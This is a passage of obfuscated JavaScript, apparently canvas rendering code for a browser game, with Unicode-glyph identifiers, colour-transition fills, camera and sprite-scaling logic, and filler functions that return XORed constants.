					}(ᐃⲆⲆⵠ.ΔᐃΔ & ΔᐃᐃΔ.ⵠⲆⲆⵠΔ) !== ⵠⲆᐃⵠ && -ᐃᐃΔ.ⲆΔΔ.x >= ⵠᐃⵠⵠ - 235 - ΔΔΔᐃ && -ᐃᐃΔ.ⲆΔΔ.x <= ⵠⵠΔᐃ + 350 && -ᐃᐃΔ.ⲆΔΔ.y >= ᐃᐃⵠⲆ - ⵠⲆᐃⲆ - 390 && -ᐃᐃΔ.ⲆΔΔ.y <= ᐃᐃⵠⲆ + 315 && ΔⲆⵠⲆᐃᐃᐃ(ᐃᐃⵠⲆ + 310, ⵠᐃⵠⵠ - 230, ⵠⵠΔᐃ + 230, ᐃᐃΔ.ΔⵠⲆⵠ[ᐃⵠⲆΔᐃ], ⲆⲆⲆ.ΔⲆⵠⵠΔ[ᐃⲆⲆⵠ.ΔᐃⲆ], ᐃⲆⲆⵠ.ΔᐃΔ & ΔᐃᐃΔ.ⵠⲆⲆⵠΔ)
				}
			}
			for (var ⵠᐃ = ⲆⲆⲆ.ᐃⵠⵠⵠⵠ.length - ⵠΔΔ; 0 <= ⵠᐃ; ⵠᐃ--) {
				var ᐃⲆⲆⵠ = ⲆⲆⲆ.ᐃⵠⵠⵠⵠ[ⵠᐃ];
				if (ᐃⲆⲆⵠ.ΔᐃⲆ !== ⲆⲆⲆ.ⵠᐃΔᐃⲆ) {
					var Ⲇⵠᐃ = ⲆⲆⲆ.ΔⲆⵠⵠΔ[ᐃⲆⲆⵠ.ΔᐃⲆ];
					if (-ᐃᐃΔ.ⲆΔΔ.x >= ᐃⲆⲆⵠ.x1 - 230 - ΔΔΔᐃ && ᐃⲆⲆⵠ.x2 + 330 >= -ᐃᐃΔ.ⲆΔΔ.x && ᐃⲆⲆⵠ.y1 - ⵠⲆᐃⲆ <= -ᐃᐃΔ.ⲆΔΔ.y && ᐃⲆⲆⵠ.y2 + ᐃⵠΔᐃᐃ >= -ᐃᐃΔ.ⲆΔΔ.y) {
						var ⵠⵠΔᐃ = ᐃⲆⲆⵠ.x2;
						if (ⲆⲆⲆ.ⵠᐃΔᐃⲆ !== ᐃⲆⲆⵠ.ΔᐃⲆ) {
							if (ΔⲆⲆ === (ᐃⲆⲆⵠ.ΔᐃΔ & ΔᐃᐃΔ.ⲆᐃᐃΔᐃ)) ⵠⵠΔᐃ -= 414;
							else ⵠⵠΔᐃ -= 610
						}
						var ⵠᐃⵠⵠ = ᐃⲆⲆⵠ.x1;
						if (ⲆⲆⲆ.ⵠᐃΔᐃⲆ !== ᐃⲆⲆⵠ.ΔᐃⲆ) {
							if ((ᐃⲆⲆⵠ.ΔᐃΔ & ΔᐃᐃΔ.ⲆᐃΔΔᐃ) === 0) ⵠᐃⵠⵠ += 414;
							else ⵠᐃⵠⵠ += 610
						}
						var ΔᐃⵠⲆ = ᐃⲆⲆⵠ.y2;
						if (ᐃⲆⲆⵠ.ΔᐃⲆ !== ⲆⲆⲆ.ⵠᐃΔᐃⲆ) {
							if ((ᐃⲆⲆⵠ.ΔᐃΔ & ΔᐃᐃΔ.ᐃΔᐃᐃⲆ) === 0) ΔᐃⵠⲆ -= 414;
							else ΔᐃⵠⲆ -= 610
						}
						var ᐃᐃⵠⲆ = ᐃⲆⲆⵠ.y1;
						if (ⲆⲆⲆ.ⵠᐃΔᐃⲆ !== ᐃⲆⲆⵠ.ΔᐃⲆ) {
							ⲆⲆⲆᐃ === (ᐃⲆⲆⵠ.ΔᐃΔ & ΔᐃᐃΔ.ⵠⲆⲆⵠΔ) ? ᐃᐃⵠⲆ += 414 : ᐃᐃⵠⲆ += 610
						}
						if (ⲆⲆⲆ.transition) {
							var ᐃΔΔⵠ = ⲆⲆⲆ.time ? ⵠᐃⵠΔ - ⲆⲆⲆ.ᐃΔΔⵠ.ΔᐃΔ : ⲆⲆⲆ.ᐃΔΔⵠ.ΔᐃΔ;
							Δ.fillStyle = ⲆΔⲆⲆⲆ(Ⲇⵠᐃ.ΔΔᐃ[ⲆΔⵠ], Ⲇⵠᐃ.ΔΔᐃ[1], Ⲇⵠᐃ.ΔΔᐃ[2], Ⲇⵠᐃ.ᐃΔⲆ[ⵠΔⲆⵠ], Ⲇⵠᐃ.ᐃΔⲆ[1], Ⲇⵠᐃ.ᐃΔⲆ[Ⲇᐃᐃⵠ], ᐃΔΔⵠ)
						} else Δ.fillStyle = Ⲇⵠᐃ.ⵠᐃᐃⵠⲆ[ⲆⲆⲆ.time];
						var ⵠΔⵠΔⵠ = Math.max(ᐃᐃΔ.ⲆΔΔ.x + ⵠᐃⵠⵠ - ⵠΔᐃᐃⵠ - 230, ⵠⲆᐃⵠ);
						var ⲆⵠΔΔⲆ = Math.max(-ᐃᐃΔ.ⲆΔΔ.x + ΔΔΔᐃ - ⵠⵠΔᐃ - 330 - ⲆᐃᐃⲆ, ⵠⲆⲆ);
						var ⵠⵠΔⲆΔ = Math.max(ᐃᐃΔ.ⲆΔΔ.y + ᐃᐃⵠⲆ - 2, 0);
						var ΔⲆⲆᐃΔ = Math.max(-ᐃᐃΔ.ⲆΔΔ.y + ⵠⲆᐃⲆ - ΔᐃⵠⲆ - ΔΔⲆⵠΔⲆⵠ - ᐃⵠⲆⲆⲆ, 0);
						Δ.beginPath();
						Δ.fillRect(ⵠΔⵠΔⵠ, ⵠⵠΔⲆΔ, ΔΔΔᐃ - ⲆⵠΔΔⲆ - ⵠΔⵠΔⵠ, ⵠⲆᐃⲆ - ⵠⵠΔⲆΔ - ΔⲆⲆᐃΔ)
					}
				}
			}
			ⵠⲆᐃΔ.ᐃⲆᐃΔⲆ && (ᐃΔΔⵠΔ(ⵠⲆⵠⵠⲆⵠⵠ, ⵠᐃᐃⲆΔᐃΔ, ᐃᐃᐃⵠᐃᐃΔ, ⲆⵠΔΔⵠⵠΔ, ⲆⲆⵠΔΔΔᐃ, Ⲇ.ⵠΔᐃⵠⲆ, ⵠ[424], 2), ᐃΔΔⵠΔ(ⵠⲆⵠⵠⲆⵠⵠ, ⵠᐃᐃⲆΔᐃΔ, ᐃᐃᐃⵠᐃᐃΔ, ⲆⵠΔΔⵠⵠΔ, ⲆⲆⵠΔΔΔᐃ, Ⲇ.ΔΔⲆΔΔ, ⵠ[424], Ⲇᐃᐃⵠ));
			ᐃΔΔⵠΔ(ᐃᐃⲆᐃⵠ, ⵠᐃᐃⲆΔᐃΔ, ᐃᐃᐃⵠᐃᐃΔ, ⲆⵠΔΔⵠⵠΔ, ⲆⲆⵠΔΔΔᐃ, Ⲇ.ⵠⵠⲆⵠᐃ, ⵠ[424], 2);
			ⵠⲆᐃΔ.ᐃⲆᐃΔⲆ && ᐃΔΔⵠΔ(ΔⲆⵠⵠⵠΔⲆᐃΔ, ⵠᐃᐃⲆΔᐃΔ, ᐃᐃᐃⵠᐃᐃΔ, ⲆⵠΔΔⵠⵠΔ, ⲆⲆⵠΔΔΔᐃ, Ⲇ.ΔΔᐃΔⲆΔⲆ, ⵠ[348]);
			var ᐃᐃᐃⵠ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⵠⲆⵠⵠⲆ];
			for (var ⵠᐃ = 0; ᐃᐃᐃⵠ.length > ⵠᐃ; ⵠᐃ++) {
				var ᐃⲆⲆ = ᐃᐃᐃⵠ[ⵠᐃ];
				for (var ᐃⵠᐃⵠ = ⵠΔⲆⵠ; ᐃⲆⲆ.ᐃΔⲆⵠⲆ.length > ᐃⵠᐃⵠ; ᐃⵠᐃⵠ++) ᐃᐃⵠⵠⲆⲆⵠⵠⲆ(ᐃⲆⲆ.ᐃΔⲆⵠⲆ[ᐃⵠᐃⵠ])
			}
			ΔⵠΔⵠⲆⵠΔ += ᐃⵠᐃᐃ * 40;
			60 < ΔⵠΔⵠⲆⵠΔ && (ΔⵠΔⵠⲆⵠΔ -= 60);
			ᐃΔΔⵠΔ(ⵠΔΔⲆⲆⲆⵠⲆᐃ, ⵠᐃᐃⲆΔᐃΔ, ᐃᐃᐃⵠᐃᐃΔ, ⲆⵠΔΔⵠⵠΔ, ⲆⲆⵠΔΔΔᐃ, Ⲇ.ⲆΔᐃΔ, "r", Δᐃᐃᐃ);
			for (var ⵠᐃ = ᐃⵠⲆⵠ; ⲆⲆⲆ.ᐃⵠⵠⵠⵠ.length > ⵠᐃ; ⵠᐃ++) {
				var ᐃⲆⲆⵠ = ⲆⲆⲆ.ᐃⵠⵠⵠⵠ[ⵠᐃ];
				if (ⲆⲆⲆ.ⵠᐃΔᐃⲆ !== ᐃⲆⲆⵠ.ΔᐃⲆ) {
					var ⵠⵠΔᐃ = ᐃⲆⲆⵠ.x2;
					if (ⲆⲆⲆ.ⵠᐃΔᐃⲆ !== ᐃⲆⲆⵠ.ΔᐃⲆ) ⵠⵠΔᐃ -= 400;
					var ⵠᐃⵠⵠ = ᐃⲆⲆⵠ.x1;
					ᐃⲆⲆⵠ.ΔᐃⲆ !== ⲆⲆⲆ.ⵠᐃΔᐃⲆ && (ⵠᐃⵠⵠ += 400);
					var ΔᐃⵠⲆ = ᐃⲆⲆⵠ.y2;
					if (ᐃⲆⲆⵠ.ΔᐃⲆ !== ⲆⲆⲆ.ⵠᐃΔᐃⲆ) ΔᐃⵠⲆ -= 300;
					var ᐃᐃⵠⲆ = ᐃⲆⲆⵠ.y1;
					ᐃⲆⲆⵠ.ΔᐃⲆ !== ⲆⲆⲆ.ⵠᐃΔᐃⲆ && (ᐃᐃⵠⲆ += 300);
					if ((ᐃⲆⲆⵠ.ΔᐃΔ & ΔᐃᐃΔ.ⲆᐃᐃΔᐃ) > 0 && ⵠⵠΔᐃ - ΔΔΔᐃ + 120 <= -ᐃᐃΔ.ⲆΔΔ.x && -ᐃᐃΔ.ⲆΔΔ.x <= ⵠⵠΔᐃ + 820 && ᐃᐃⵠⲆ + 88 - ⵠⲆᐃⲆ <= -ᐃᐃΔ.ⲆΔΔ.y && ΔᐃⵠⲆ + 50 >= -ᐃᐃΔ.ⲆΔΔ.y) ΔⲆⲆᐃⵠΔⵠ(ⵠⵠΔᐃ, ᐃᐃⵠⲆ + 88, ΔᐃⵠⲆ - 88, ᐃᐃΔ.ΔⵠⲆⵠ[0], ⲆⲆⲆ.ΔⲆⵠⵠΔ[ᐃⲆⲆⵠ.ΔᐃⲆ], ᐃⲆⲆⵠ.ΔᐃΔ & ΔᐃᐃΔ.ⲆᐃᐃΔᐃ);
					if (ⵠⲆᐃⵠ < (ᐃⲆⲆⵠ.ΔᐃΔ & ΔᐃᐃΔ.ⲆᐃΔΔᐃ) && ⵠᐃⵠⵠ - ΔΔΔᐃ - 700 <= -ᐃᐃΔ.ⲆΔΔ.x && ⵠᐃⵠⵠ - 20 >= -ᐃᐃΔ.ⲆΔΔ.x && -ᐃᐃΔ.ⲆΔΔ.y >= ᐃᐃⵠⲆ + 88 - ⵠⲆᐃⲆ && ΔᐃⵠⲆ + 50 >= -ᐃᐃΔ.ⲆΔΔ.y) ΔⲆⲆⵠΔⲆⲆ(ⵠᐃⵠⵠ, ᐃᐃⵠⲆ + 88, ΔᐃⵠⲆ - 88, ᐃᐃΔ.ΔⵠⲆⵠ[1], ⲆⲆⲆ.ΔⲆⵠⵠΔ[ᐃⲆⲆⵠ.ΔᐃⲆ], ᐃⲆⲆⵠ.ΔᐃΔ & ΔᐃᐃΔ.ⲆᐃΔΔᐃ);
					0 < (ᐃⲆⲆⵠ.ΔᐃΔ & ΔᐃᐃΔ.ᐃΔᐃᐃⲆ) && ⵠᐃⵠⵠ - 235 - ΔΔΔᐃ <= -ᐃᐃΔ.ⲆΔΔ.x && ⵠⵠΔᐃ + 350 >= -ᐃᐃΔ.ⲆΔΔ.x && ΔᐃⵠⲆ - ⵠⲆᐃⲆ - 275 <= -ᐃᐃΔ.ⲆΔΔ.y && -ᐃᐃΔ.ⲆΔΔ.y <= ΔᐃⵠⲆ + 490 && ΔⵠᐃⲆᐃⲆⲆ(ΔᐃⵠⲆ - 230, ⵠᐃⵠⵠ - 230, ⵠⵠΔᐃ + 230, ᐃᐃΔ.ΔⵠⲆⵠ[2], ⲆⲆⲆ.ΔⲆⵠⵠΔ[ᐃⲆⲆⵠ.ΔᐃⲆ], ᐃⲆⲆⵠ.ΔᐃΔ & ΔᐃᐃΔ.ᐃΔᐃᐃⲆ);
					if ((ᐃⲆⲆⵠ.ΔᐃΔ & ΔᐃᐃΔ.ⵠⲆⲆⵠΔ) > 0 && -ᐃᐃΔ.ⲆΔΔ.x >= ⵠᐃⵠⵠ - 235 - ΔΔΔᐃ && -ᐃᐃΔ.ⲆΔΔ.x <= ⵠⵠΔᐃ + 350 && ᐃᐃⵠⲆ - ⵠⲆᐃⲆ - 390 <= -ᐃᐃΔ.ⲆΔΔ.y && -ᐃᐃΔ.ⲆΔΔ.y <= ᐃᐃⵠⲆ + 315) ⲆᐃⲆΔΔᐃᐃ(ᐃᐃⵠⲆ + 310, ⵠᐃⵠⵠ - 230, ⵠⵠΔᐃ + 230, ᐃᐃΔ.ΔⵠⲆⵠ[3], ⲆⲆⲆ.ΔⲆⵠⵠΔ[ᐃⲆⲆⵠ.ΔᐃⲆ], ᐃⲆⲆⵠ.ΔᐃΔ & ΔᐃᐃΔ.ⵠⲆⲆⵠΔ)
				}
			}
		}

		function ⲆᐃⲆΔΔᐃᐃ(ⵠⵠᐃᐃΔ, ⵠⵠⲆᐃΔ, ⵠΔⲆΔⲆ, ΔⵠⲆⵠ, ᐃⲆⲆⵠ, ᐃΔⲆᐃ) {
			var w1 = ΔⵠⲆⵠ.w1;
			var w2 = ΔⵠⲆⵠ.w2;
			var w3 = ΔⵠⲆⵠ.w3;
			var ⵠⲆⲆⲆ = ᐃᐃΔ.ⲆΔΔ.y + ⵠⵠᐃᐃΔ - 700;
			var ⵠΔⵠΔⵠ = Math.max(ᐃᐃΔ.ⲆΔΔ.x + ⵠⵠⲆᐃΔ, Δᐃᐃᐃ);
			var ⲆⵠΔΔⲆ = Math.max(-ᐃᐃΔ.ⲆΔΔ.x + ΔΔΔᐃ - ⵠΔⲆΔⲆ - ΔᐃΔᐃΔ, 0);
			var ⵠⲆⲆΔ = ⵠΔⵠΔⵠ;
			var ᐃⵠΔᐃⲆ = ΔΔΔᐃ - ⵠΔⵠΔⵠ - ⲆⵠΔΔⲆ;
			if (ᐃΔⲆᐃ) var ᐃⵠⵠ = ΔⵠⲆⵠ.ΔᐃⲆ(w1);
			else var ᐃⵠⵠ = w1.r;
			var Δⵠⵠᐃ = ⵠⲆⲆⲆ + ΔᐃᐃΔ.ᐃⲆᐃΔΔ;
			var ⵠΔᐃᐃᐃ = ⵠⲆⲆΔ,
				ΔᐃΔΔⲆ = Δⵠⵠᐃ,
				ᐃΔΔΔᐃ = ᐃⵠⵠ.x + ΔᐃᐃΔ.ΔⲆⵠᐃᐃ,
				ΔΔⵠΔⵠ = ᐃⵠΔᐃⲆ;
			Δⵠⵠᐃ += ᐃⵠⵠ.x + ΔᐃᐃΔ.ΔⲆⵠᐃᐃ - 2;
			var ⲆΔΔᐃⲆ = Δⵠⵠᐃ;
			if (ᐃΔⲆᐃ) var ᐃⵠⵠ = ΔⵠⲆⵠ.ΔᐃⲆ(w2);
			else var ᐃⵠⵠ = w2.r;
			var d2 = ⵠⲆⲆⲆ + ΔᐃᐃΔ.ⵠⵠᐃⲆΔ - Δⵠⵠᐃ + ᐃⵠⵠ.x;
			var ΔΔᐃⵠΔ = Δⵠⵠᐃ,
				ⲆᐃᐃⲆⲆ = ⵠⲆⲆΔ,
				ⲆⲆᐃⲆᐃ = d2,
				ᐃⲆⲆⵠⲆ = ᐃⵠΔᐃⲆ;
			Δⵠⵠᐃ += d2 - 2;
			var ⲆⵠⵠⵠΔ = Δⵠⵠᐃ - ΔⵠⵠΔ;
			if (ᐃΔⲆᐃ) var ᐃⵠⵠ = ΔⵠⲆⵠ.ΔᐃⲆ(w3);
			else var ᐃⵠⵠ = w3.r;
			d2 = ⵠⲆⲆⲆ + ΔᐃᐃΔ.Ⲇⵠⵠᐃⵠ - Δⵠⵠᐃ + ᐃⵠⵠ.x;
			if (Δⵠⵠᐃ + d2 - ΔⲆᐃⲆ > ⲆⵠⵠⵠΔ) {
				var ΔΔⲆΔⵠ = true;
				var ⲆΔⲆⲆⵠ = Δⵠⵠᐃ,
					ΔⲆΔΔⵠ = ⵠⲆⲆΔ,
					ΔⵠᐃΔΔ = d2,
					ⵠⵠⵠⵠᐃ = ᐃⵠΔᐃⲆ;
				Δⵠⵠᐃ += d2 - 2;
				var ⵠᐃᐃⵠΔ = Δⵠⵠᐃ
			} else {
				var ΔΔⲆΔⵠ = false;
				Δⵠⵠᐃ = ⲆⵠⵠⵠΔ;
				var ⵠᐃᐃⵠΔ = -1
			}
			d2 = ⵠⲆⲆⲆ + ΔᐃᐃΔ.ΔΔᐃΔⲆᐃⵠ - Δⵠⵠᐃ;
			if (ⲆⲆⲆ.transition) {
				var ᐃΔΔⵠ = ⲆⲆⲆ.time ? 1 - ⲆⲆⲆ.ᐃΔΔⵠ.ΔᐃΔ : ⲆⲆⲆ.ᐃΔΔⵠ.ΔᐃΔ;
				Δ.fillStyle = ⲆΔⲆⲆⲆ(9, 55, 63, 11, 106, 132, ᐃΔΔⵠ)
			} else Δ.fillStyle = Ⲇ.ⵠⵠᐃⵠⵠ[ⲆⲆⲆ.time];
			Δ.fillRect(ⵠΔᐃᐃᐃ, ΔᐃΔΔⲆ, ΔΔⵠΔⵠ, ᐃΔΔΔᐃ);
			if (ᐃΔⲆᐃ) {
				if (ⲆⲆⲆ.transition) {
					var ᐃΔΔⵠ = ⲆⲆⲆ.time ? ⵠΔⲆ - ⲆⲆⲆ.ᐃΔΔⵠ.ΔᐃΔ : ⲆⲆⲆ.ᐃΔΔⵠ.ΔᐃΔ;
					Δ.fillStyle = ⲆΔⲆⲆⲆ(15, 70, 76, 42, 139, 155, ᐃΔΔⵠ)
				} else Δ.fillStyle = Ⲇ.ⵠⲆΔΔᐃⵠⲆ[ⲆⲆⲆ.time]
			} else {
				if (ⲆⲆⲆ.transition) {
					var ᐃΔΔⵠ = ⲆⲆⲆ.time ? 1 - ⲆⲆⲆ.ᐃΔΔⵠ.ΔᐃΔ : ⲆⲆⲆ.ᐃΔΔⵠ.ΔᐃΔ;
					Δ.fillStyle = ⲆΔⲆⲆⲆ(9, 55, 63, 11, 106, 132, ᐃΔΔⵠ)
				} else Δ.fillStyle = Ⲇ.ⵠⵠᐃⵠⵠ[ⲆⲆⲆ.time]
			}
			Δ.fillRect(ⲆᐃᐃⲆⲆ, ΔΔᐃⵠΔ, ᐃⲆⲆⵠⲆ, ⲆⲆᐃⲆᐃ);
			if (ΔΔⲆΔⵠ) {
				if (ᐃΔⲆᐃ) {
					if (ⲆⲆⲆ.transition) {
						var ᐃΔΔⵠ = ⲆⲆⲆ.time ? 1 - ⲆⲆⲆ.ᐃΔΔⵠ.ΔᐃΔ : ⲆⲆⲆ.ᐃΔΔⵠ.ΔᐃΔ;
						Δ.fillStyle = ⲆΔⲆⲆⲆ(17, 94, 96, 169, 214, 211, ᐃΔΔⵠ)
					} else Δ.fillStyle = Ⲇ.ᐃⵠⵠⵠΔΔⵠ[ⲆⲆⲆ.time]
				} else {
					if (ⲆⲆⲆ.transition) {
						var ᐃΔΔⵠ = ⲆⲆⲆ.time ? 1 - ⲆⲆⲆ.ᐃΔΔⵠ.ΔᐃΔ : ⲆⲆⲆ.ᐃΔΔⵠ.ΔᐃΔ;
						Δ.fillStyle = ⲆΔⲆⲆⲆ(9, 55, 63, 11, 106, 132, ᐃΔΔⵠ)
					} else Δ.fillStyle = Ⲇ.ⵠⵠᐃⵠⵠ[ⲆⲆⲆ.time]
				}
				Δ.fillRect(ΔⲆΔΔⵠ, ⲆΔⲆⲆⵠ, ⵠⵠⵠⵠᐃ, ΔⵠᐃΔΔ)
			}
			if (ⵠⲆᐃΔ.ᐃⲆᐃΔⲆ && ᐃΔⲆᐃ) ΔⵠⲆⵠ.ⵠⲆΔⲆⲆᐃⵠᐃΔ(ⲆⵠⵠⵠΔ, ⵠᐃᐃⵠΔ, ⲆΔΔᐃⲆ, ⵠⲆⲆⲆ, -ᐃᐃΔ.ⲆΔΔ.x + ⵠΔᐃᐃᐃ, -ᐃᐃΔ.ⲆΔΔ.x + ⵠΔᐃᐃᐃ + ΔΔⵠΔⵠ)
		}

		function ΔⲆⵠᐃᐃΔⲆ(ⲆΔᐃⲆⲆⲆΔ, ᐃΔΔⲆΔⲆⵠ, ⲆΔΔΔᐃⲆⲆ, ⲆΔⲆΔΔΔᐃ, ᐃΔᐃⲆᐃⲆΔ) {
			ⲆⵠΔⵠⲆΔᐃ(ⲆᐃΔⵠⲆ, ⲆΔᐃⲆⲆⲆΔ, ᐃΔΔⲆΔⲆⵠ, ⲆΔΔΔᐃⲆⲆ, ⲆΔⲆΔΔΔᐃ, ᐃΔᐃⲆᐃⲆΔ);
			const ΔⲆΔⲆΔᐃⲆΔΔ = ⵠΔᐃⲆΔΔⵠ(ΔᐃΔᐃ[0], ΔᐃΔᐃ[1]);
			const ⲆⲆᐃᐃΔΔⵠᐃⵠ = ᐃᐃΔᐃⲆᐃⲆ(ΔᐃΔᐃ[2], ΔᐃΔᐃ[3], ΔᐃΔᐃ[4], ΔᐃΔᐃ[0], ΔᐃΔᐃ[1], ΔᐃΔᐃ[ⲆⲆΔᐃ]);
			const ΔⲆⲆⲆᐃΔⲆᐃᐃ = ΔⲆΔⲆΔᐃⲆΔΔ ^ 59328;
			return ΔⲆⲆⲆᐃΔⲆᐃᐃ
		}
		var ΔⵠᐃΔᐃᐃⲆⵠᐃ = 0;
		var ᐃⵠⵠⲆⲆⲆᐃⲆⵠ = 1;
		var ⲆⲆⲆΔⲆᐃⵠⲆΔ = 0;
		var ⲆⲆⲆⲆᐃⲆᐃⵠⲆ = 1;
		var ⲆⲆⵠⲆⲆΔᐃᐃᐃ = ΔΔⵠ;
		var ⲆΔⲆⲆⵠⲆΔΔᐃ = ᐃᐃⵠ;
		var ᐃᐃᐃⵠΔⵠΔⵠⵠ = ⵠⲆᐃⵠ;
		var ⵠΔⵠⵠΔⲆΔⵠΔ = ⵠΔᐃ;
		var ΔⵠΔⲆⲆⵠᐃᐃⵠ = 0;
		var ᐃΔⲆⵠᐃⵠⲆΔΔ = 1;
		var ΔⵠΔⵠⵠΔΔΔⵠ = ΔΔⵠⵠ;
		var ᐃⲆⲆᐃⲆᐃⲆΔⵠ = ΔᐃⲆⵠ;
		var ΔᐃᐃΔⲆ = 0;
		var ⵠⲆⵠⵠⵠ = 1;
		var ᐃᐃⵠΔⲆ = ΔⵠᐃⲆ;
		var ⵠⲆⲆΔᐃΔΔ = Δⵠᐃ;
		var ΔᐃⵠⵠᐃⲆⲆ = 1;
		var ᐃΔⵠⵠ = 2;

		function ΔΔⲆⲆ(ᐃⵠ, ΔⲆⲆΔⲆ, Δⵠ, ⲆⵠⲆ, ⲆᐃⲆⵠᐃ) {
			var Δᐃ = {
				x: Δⵠ,
				y: ⲆⵠⲆ,
				"ᐃΔⵠᐃᐃ": Δⵠ,
				"ᐃᐃΔⵠⵠ": ⲆⵠⲆ
			};
			var ΔᐃΔⵠ = function(ΔⵠΔᐃΔ) {
				ΔⲆΔⵠ(ΔⵠΔᐃΔ, ᐃⵠ, Δᐃ.x, Δᐃ.y, ᐃⵠ.width / ⲆΔΔⵠ, ᐃⵠ.height / Δᐃⵠⵠ)
			};
			return {
				translate: Δᐃ,
				"ΔᐃΔⵠ": ΔᐃΔⵠ,
				active: ΔⲆⲆΔⲆ,
				position: ⲆᐃⲆⵠᐃ
			}
		}

		function ⲆΔΔⲆΔⵠᐃ(ⲆⲆⲆᐃⵠΔᐃ, ΔᐃⵠᐃⲆᐃΔ, ᐃⲆⲆᐃⲆⵠΔ, ⲆⲆⵠΔΔⵠⲆ) {
			ⵠΔᐃⵠΔᐃⲆ(ⲆᐃΔⵠⲆ, ⲆⲆⲆᐃⵠΔᐃ, ΔᐃⵠᐃⲆᐃΔ, ᐃⲆⲆᐃⲆⵠΔ, ⲆⲆⵠΔΔⵠⲆ);
			const ᐃΔⲆᐃⵠᐃⲆ = ⵠΔᐃⲆΔΔⵠ(ΔᐃΔᐃ[ⵠᐃⲆᐃ], ΔᐃΔᐃ[1]);
			const ⲆΔᐃᐃΔΔⲆΔΔ = ⲆⲆⵠⵠⲆⲆⵠ(ΔᐃΔᐃ[2], ΔᐃΔᐃ[ΔᐃⲆΔ], ΔᐃΔᐃ[Δⵠᐃ], ΔᐃΔᐃ[1], ΔᐃΔᐃ[2], ΔᐃΔᐃ[ᐃᐃⲆΔⵠ]);
			const ΔⲆΔⲆΔᐃⲆⲆⲆ = (37334 | ᐃΔⲆᐃⵠᐃⲆ) & ~(37334 & ᐃΔⲆᐃⵠᐃⲆ);
			return ΔⲆΔⲆΔᐃⲆⲆⲆ
		}

		function ᐃᐃΔΔⲆᐃΔΔⲆ(ᐃⵠ) {
			ᐃⵠ.scale += ᐃⵠ.ᐃΔⲆⲆ ? ᐃⵠᐃᐃ / ᐃⵠ.ⵠⵠⵠⵠⵠᐃᐃ : -ᐃⵠᐃᐃ / ᐃⵠ.ᐃⵠⵠΔⵠΔⵠ;
			if (ᐃⵠ.scale > ᐃⵠ.end) ᐃⵠ.ᐃΔⲆⲆ = false;
			else if (ᐃⵠ.start > ᐃⵠ.scale) ᐃⵠ.ᐃΔⲆⲆ = true
		}

		function ΔΔᐃᐃᐃⵠⵠ(ᐃⵠᐃⲆΔ, ⲆᐃⲆⵠⲆᐃⲆ) {
			ᐃᐃⵠΔᐃᐃᐃ(ⲆᐃΔⵠⲆ, ᐃⵠᐃⲆΔ, ⲆᐃⲆⵠⲆᐃⲆ);
			const ΔⵠᐃⲆᐃⲆᐃ = ΔΔᐃⵠΔᐃⲆ(ΔᐃΔᐃ[0], ΔᐃΔᐃ[ⵠⲆΔ], ΔᐃΔᐃ[ⲆⲆⲆᐃ], ΔᐃΔᐃ[1], ΔᐃΔᐃ[0], ΔᐃΔᐃ[ΔΔΔ]);
			const ⵠⲆⵠⵠᐃᐃⲆⵠᐃ = ΔⲆⵠᐃᐃΔⲆ(ΔᐃΔᐃ[0], ΔᐃΔᐃ[1], ΔᐃΔᐃ[ΔΔⵠ], ΔᐃΔᐃ[1], ΔᐃΔᐃ[ΔⲆⲆ]);
			const ᐃΔᐃⵠΔᐃⲆⲆᐃ = ~(ΔⵠᐃⲆᐃⲆᐃ & 30873) & 30873 | ~(30873 & ΔⵠᐃⲆᐃⲆᐃ) & ΔⵠᐃⲆᐃⲆᐃ;
			return ᐃΔᐃⵠΔᐃⲆⲆᐃ
		}

		function ᐃⵠΔⲆⲆⵠᐃⲆΔ(ᐃⵠ) {
			var Δᐃ = {
				x: 0,
				y: 0
			};
			var ΔᐃΔⵠ = function(ΔⵠΔᐃΔ) {
				ΔⲆΔⵠ(ΔⵠΔᐃΔ, ᐃⵠ, Δᐃ.x, Δᐃ.y)
			};
			return {
				"ᐃⵠ": ᐃⵠ,
				translate: Δᐃ,
				"ΔᐃΔⵠ": ΔᐃΔⵠ
			}
		}

		function ΔΔⵠᐃⵠᐃⲆΔᐃ(Δ) {
			Δ[ΔᐃⲆⵠⲆⵠΔ[109]] = ΔᐃᐃⲆⲆ;
			Δ.ᐃᐃⵠⲆⵠΔᐃⲆⲆ = ⲆΔⵠⲆΔ;
			Δ.ⲆΔⵠⵠⵠⲆⵠΔⲆ = ⲆⵠΔⵠΔ;
			Δ.ⲆⲆⲆΔⲆΔᐃᐃⵠ = ⲆᐃⵠⲆⵠ;
			Δ.ⵠⲆⲆᐃⲆᐃⲆⲆΔ = ⲆΔᐃⲆΔ
		}

		function ᐃⵠΔⵠᐃΔⲆ(Ⲇⵠ, ΔΔΔⲆ) {
			var ⲆΔⲆᐃⲆᐃΔ = Ⲇⵠ.getBoundingClientRect();
			return {
				x: ΔΔΔⲆ.clientX - ⲆΔⲆᐃⲆᐃΔ.left,
				y: ΔΔΔⲆ.clientY - ⲆΔⲆᐃⲆᐃΔ.top
			}
		}

		function ⲆⲆᐃⵠΔⵠᐃᐃⲆ(ᐃⵠ, ⲆⲆⵠⲆⲆⲆᐃ, ΔⵠΔΔΔ, ⵠⵠⵠⵠⵠᐃᐃ, ᐃⵠⵠΔⵠΔⵠ, ⵠⲆⵠ, ΔΔⲆ) {
			ᐃⵠ.end = ⲆⲆⵠⲆⲆⲆᐃ;
			ᐃⵠ.start = ΔⵠΔΔΔ;
			ᐃⵠ.ⵠⵠⵠⵠⵠᐃᐃ = ⵠⵠⵠⵠⵠᐃᐃ;
			ᐃⵠ.ᐃⵠⵠΔⵠΔⵠ = ᐃⵠⵠΔⵠΔⵠ;
			ᐃⵠ.width = ᐃⵠ.ᐃⵠ.width;
			ᐃⵠ.height = ᐃⵠ.ᐃⵠ.height;
			ᐃⵠ.scale = (ⲆⲆⵠⲆⲆⲆᐃ + ΔⵠΔΔΔ) / ⵠⵠⵠΔ;
			ᐃⵠ.ᐃΔⲆⲆ = false;
			ᐃⵠ.ΔᐃΔⵠ = function(Δ) {
				ᐃⵠ.translate.x = Δᐃⵠᐃ - ᐃⵠ.width / ⵠΔⲆᐃ;
				ΔⲆΔⵠ(Δ, ᐃⵠ.ᐃⵠ, 0, ΔᐃΔΔ, ᐃⵠ.ᐃⵠ.width, ᐃⵠ.ᐃⵠ.height, ᐃⵠ.translate.x, ᐃⵠ.translate.y, ᐃⵠ.width, ᐃⵠ.height)
			}
		}

